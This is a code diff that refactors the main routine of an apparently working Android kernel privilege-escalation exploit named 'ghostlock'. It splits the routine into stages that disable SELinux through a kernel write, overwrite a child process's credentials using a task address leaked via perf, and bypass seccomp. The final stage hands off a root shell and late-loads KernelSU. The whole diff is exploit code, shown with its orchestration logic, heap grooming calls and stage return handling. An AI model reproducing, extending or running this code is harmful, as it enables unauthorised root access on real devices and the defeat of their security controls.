@@ -1332,11 +1332,17 @@ static int verify_leaf_dir_stage(void *context) {
     return 0;
 }
 
-/* Decoupling plan: top-level lifecycle and W1/W2/W3 orchestration. Inputs:
- * argv/environment snapshot; output: stable process exit code. Future:
- * exploit_session_run(ExploitSession *), delegating profile, heap, race, route,
- * victim and cleanup responsibilities to their contexts. */
-int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
+/* State handed from the W2/W3 victim chain to the late-load stage. */
+struct VictimChain {
+    pid_t child = -1;
+    int child_alive = 1;
+    int seccomp_ok = 0;
+    int ever_rooted = 0;
+};
+
+/* Stage split: process setup and profile selection. Returns 0 on success and 1
+ * when the caller must exit with code 1. */
+static int run_setup_stage(const char *profile_path) {
     heap_context_init(&g_heap_context);
     if (!profile_path) {
         pr_error("missing required --profile <resolved-profile.json>\n");
@@ -1365,19 +1371,13 @@ int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
 
     timer_reset();
     TIMER("exploit start");
+    return 0;
+}
 
-    if (runtime_config_snapshot().multicast_phase1_probe) {
-        if (!kernel5_route_selected()) {
-            pr_error("5.x phase-1 probe requested for a non-5.x profile\n");
-            return 1;
-        }
-        pr_info("5.x phase-1 probe: cycle/stamp/adjust/disarm only\n");
-        int ok = kernel5_resident_start();
-        if (ok) kernel5_resident_stop();
-        pr_info("5.x phase-1 probe result=%s\n", ok ? "pass" : "fail");
-        return ok ? 0 : 1;
-    }
-
+/* Stage split: W1 SELinux plus the one-shot scratch repair / resident policycap
+ * repair. Returns 0 on failure (caller exits 1), 1 to continue and 2 when the
+ * w1-only diagnostic already finished (caller exits 0). */
+static int run_w1_stage(ghostlock::ExploitSession &session) {
     /* W1: disable SELinux before task discovery. untrusted_app may not be able
      * to read enforce while it is still enforcing, so attempt W1 regardless. */
     int selinux_ok = check_selinux_off();
@@ -1400,7 +1400,7 @@ int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
         if (!selinux_ok) {
             pr_warning("Write 1 failed\n");
             kernel5_resident_stop();
-            return 1;
+            return 0;
         }
         if (kernel5_route_selected() &&
                 !runtime_config_snapshot().multicast_resident_enabled) {
@@ -1408,7 +1408,7 @@ int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
                     (g_heap_context.current.base) + PROFILE_VALUES->mcast_buffer_size;
             if (!quarantine_reclaim_sockets()) {
                 pr_warning("W1 scratch page quarantine failed\n");
-                return 1;
+                return 0;
             }
             int repaired = 0;
             int repair_attempts =
@@ -1429,7 +1429,7 @@ int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
                 release_quarantined_reclaim_sockets();
             } else {
                 pr_warning("private scratch repair failed; keeping page quarantined\n");
-                return 1;
+                return 0;
             }
         }
         if (kernel5_route_selected() &&
@@ -1446,18 +1446,24 @@ int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
                     repair)) {
                 pr_warning("W1 policycap repair failed\n");
                 kernel5_resident_stop();
-                return 1;
+                return 0;
             }
         }
         TIMER("Write 1 complete");
         if (runtime_config_snapshot().w1_only) {
             pr_success("W1-only diagnostic complete\n");
-            return 0;
+            return 2;
         }
     } else {
         pr_success("SELinux already permissive\n");
     }
+    return 1;
+}
 
+/* Stage split: the W2/W3 victim chain. Returns 0 on failure (caller exits 1)
+ * and 1 to continue to the late-load stage. */
+static int run_w2_w3_chain(ghostlock::ExploitSession &session,
+        struct VictimChain *chain) {
     /* W2: overwrite the child credential via the task leaked by perf. */
     slab_drain();
     TIMER("pre-W2 drain");
@@ -1466,11 +1472,11 @@ int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
      * reference keeps the W2/W3 stage code unchanged. */
     ghostlock::VictimContext &pipes = session.victim;
     struct w2_stage_context w2_context = {.pipes = &pipes};
-    pid_t child = -1;
+    pid_t &child = chain->child;
     uintptr_t child_task = 0;
-    int child_alive = 1;
-    int seccomp_ok = 0;
-    int ever_rooted = 0;
+    int &child_alive = chain->child_alive;
+    int &seccomp_ok = chain->seccomp_ok;
+    int &ever_rooted = chain->ever_rooted;
     /* SESSION-02: parked handoff state is owned by the session. */
     pid_t &parked_child = session.parked_victim;
     ghostlock::UniqueFd &parked_cmd_w = session.parked_victim_cmd;
@@ -1498,7 +1504,7 @@ int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
         child = spawn_victim(&pipes, &child_task);
         if (child < 0) {
             pr_warning("fork failed\n");
-            return 1;
+            return 0;
         }
         TIMER("perf_find_task done");
 
@@ -1588,7 +1594,7 @@ int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
             pr_warning("W2 failed after %u rounds\n",
                     execution_settings()->w2_attempts);
             waitpid(child, NULL, WNOHANG);
-            return 1;
+            return 0;
         }
         ever_rooted = 1;
         /* rooted children never exit; chain failures park (P) */
@@ -1674,6 +1680,22 @@ int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
     if (!seccomp_ok)
         pr_warning("W3 seccomp bypass failed after %d chain rounds; ksud late-load will likely stay blocked\n",
                 chain_rounds);
+    return 1;
+}
+
+/* Stage split: settle, root-shell handoff and KernelSU late-load. Returns the
+ * process exit code. */
+static int run_handoff_stage(ghostlock::ExploitSession &session,
+        const struct VictimChain &chain) {
+    const pid_t child = chain.child;
+    const int child_alive = chain.child_alive;
+    const int seccomp_ok = chain.seccomp_ok;
+    const int ever_rooted = chain.ever_rooted;
+    /* SESSION-02: the victim protocol pipes and parked handoff state are owned
+     * by the session. */
+    ghostlock::VictimContext &pipes = session.victim;
+    pid_t &parked_child = session.parked_victim;
+    ghostlock::UniqueFd &parked_cmd_w = session.parked_victim_cmd;
 
     /* Let the repaired credential and reclaimed waiter state settle before the
      * rooted child reloads SELinux policy and late-loads KernelSU.  Dispatching
@@ -1734,6 +1756,35 @@ int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
         pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
     kernel5_resident_stop();
     return 0;
+}
+
+/* Decoupling plan: top-level lifecycle and W1/W2/W3 orchestration. Inputs:
+ * argv/environment snapshot; output: stable process exit code. Future:
+ * exploit_session_run(ExploitSession *), delegating profile, heap, race, route,
+ * victim and cleanup responsibilities to their contexts. */
+int run_exploit(ghostlock::ExploitSession &session, const char *profile_path) {
+    if (run_setup_stage(profile_path) != 0) return 1;
+
+    if (runtime_config_snapshot().multicast_phase1_probe) {
+        if (!kernel5_route_selected()) {
+            pr_error("5.x phase-1 probe requested for a non-5.x profile\n");
+            return 1;
+        }
+        pr_info("5.x phase-1 probe: cycle/stamp/adjust/disarm only\n");
+        int ok = kernel5_resident_start();
+        if (ok) kernel5_resident_stop();
+        pr_info("5.x phase-1 probe result=%s\n", ok ? "pass" : "fail");
+        return ok ? 0 : 1;
+    }
+
+    const int w1 = run_w1_stage(session);
+    if (w1 == 0) return 1;
+    if (w1 == 2) return 0;
+
+    VictimChain chain;
+    if (run_w2_w3_chain(session, &chain) == 0) return 1;
+
+    return run_handoff_stage(session, chain);
 }
 
 /* Decoupling plan: native executable adapter. Inputs: argc/argv; output: stable
